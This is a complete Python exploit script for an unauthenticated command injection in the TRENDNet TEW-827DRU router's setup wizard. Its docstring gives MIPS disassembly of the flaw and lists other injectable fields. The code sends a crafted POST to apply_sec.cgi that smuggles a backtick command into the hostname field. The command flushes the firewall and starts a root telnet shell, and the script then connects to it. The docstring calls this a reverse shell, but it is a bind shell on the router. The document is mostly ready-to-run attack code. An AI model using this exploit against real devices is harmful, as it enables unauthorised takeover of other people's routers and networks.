"""
This script exercises an unauthenticated vulnerability in the TRENDNet TEW-827DRU H/W 2.0 F/W 2.04 to open and connect
to a reverse shell.

The router allows unauthenticated access to the setup wizard functionality. Within the setup wizard there is a command
injection while processing all user defined values to the do_wizard_wan_l2tp_cgi function. The vulnerable disassembly
for the first user processed values is shown below.

LOAD:0043DAB0                 addiu   $s0, $v0, (aUciSetNetworkW_0 - 0x4D0000)  # "uci set network.wan.hostname=%s"
LOAD:0043DAB4                 la      $v0, aTDelay     # "t_delay"
LOAD:0043DAB8                 nop
LOAD:0043DABC                 addiu   $a0, $v0, (aSystemSystem0H_0 - 0x4C0000)  # "system.@system[0].hostname"
LOAD:0043DAC0                 la      $v0, safe_getenv
LOAD:0043DAC4                 nop
LOAD:0043DAC8                 move    $t9, $v0
LOAD:0043DACC                 bal     safe_getenv
LOAD:0043DAD0                 nop
LOAD:0043DAD4                 lw      $gp, 0x138+saved_gp($fp)
LOAD:0043DAD8                 addiu   $v1, $fp, 0x138+var_114
LOAD:0043DADC                 move    $a0, $v1         # s
LOAD:0043DAE0                 move    $a1, $s0         # format
LOAD:0043DAE4                 move    $a2, $v0
LOAD:0043DAE8                 la      $v0, sprintf
LOAD:0043DAEC                 nop
LOAD:0043DAF0                 move    $t9, $v0
LOAD:0043DAF4                 jalr    $t9 ; sprintf
LOAD:0043DAF8                 nop
LOAD:0043DAFC                 lw      $gp, 0x138+saved_gp($fp)
LOAD:0043DB00                 addiu   $v0, $fp, 0x138+var_114
LOAD:0043DB04                 move    $a0, $v0         # command
LOAD:0043DB08                 la      $v0, _system
LOAD:0043DB0C                 nop
LOAD:0043DB10                 move    $t9, $v0
LOAD:0043DB14                 jalr    $t9 ; _system
LOAD:0043DB18                 nop

system.@system[0].hostname can be replace with other user defined values requiring minimal changes to the exploit. The
other valid values are:
    - cameo.wan.wan_l2tp_server_ip
    - cameo.wan.wan_l2tp_username
    - cameo.wan.wan_l2tp_password
    - cameo.wan.wan_l2tp_ipaddr (requires cameo.wan.wan_l2tp_dynamic != 1)
    - cameo.wan.wan_l2tp_netmask (requires cameo.wan.wan_l2tp_dynamic != 1)
    - cameo.wan.wan_l2tp_gateway (requires cameo.wan.wan_l2tp_dynamic != 1)

The packet is generated using the Mips Overflow Writer from https://github.com/fuzzywalls/mow
"""
import mow
import time
import argparse
import telnetlib


def telnet_connect(host, port):
    """
    Connect to a telnet server.

    :param host: Host the telnet server is running on.
    :type host: str

    :param port: Listening port of the telnet server.
    :type port: int

    :return: Open telnet session or None
    """
    try:
        return telnetlib.Telnet(host, port, 0.1)
    except:
        return None


def generate_exploit(host, port, command):
    """
    Generate exploit packet to send to the target.

    :param host: IP address of the target.
    :type host: str

    :param port: Listening port of the target.
    :type port: int

    :param command: Command to execute on successful exploitation.
    :type command: str

    :return: Packet to send to the target.
    :rtype: bytes
    """
    command = b'`' + bytes(command.replace(' ', '${IFS}'), 'utf8') + b'`'
    data = {b'ccp_act': b'set',
            b'action': b'wizard_wan',
            b'cameo.wan.wan_proto': b'l2tp',
            b'cameo.wan.wan_l2tp_dynamic': b'1',
            b'system.@system[0].hostname': command}

    data = b'&'.join(b'%s=%s' % (key, value) for key,value in data.items())
    request = mow.CustomRequest(host, port, mow.POST, b'apply_sec.cgi', data=data)
    packet = request.create_packet()
    return packet


def exploit_target(host, port, telnet_port):
    """
    Send the exploit to the target and connect to the reverse shell.

    :param host: Target IP address.
    :type host: str

    :param port: Target port.
    :type port: int

    :param telnet_port: Telnet port to open on the target.
    :type telnet_port: int
    """
    telnet_command = 'iptables -F|telnetd -l /bin/sh -p %d' % telnet_port
    packet = generate_exploit(host, port, telnet_command)

    try:
        mow.send_packet(host, port, packet)
    except:
        pass
    time.sleep(3)
    tn = telnet_connect(host, telnet_port)

    tn.interact()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Unauthenticated command injection exploit for TRENDNet TEW-827DRU.')

    parser.add_argument('-i', '--ip', help='Target IP address', required=True)
    parser.add_argument('-p', '--port', help='Target port.', type=int, default=80)
    parser.add_argument('-t', '--tport', help='Telnet port to connect to on successful exploitation.', type=int)

    args = parser.parse_args()

    exploit_target(args.ip, args.port, args.tport)
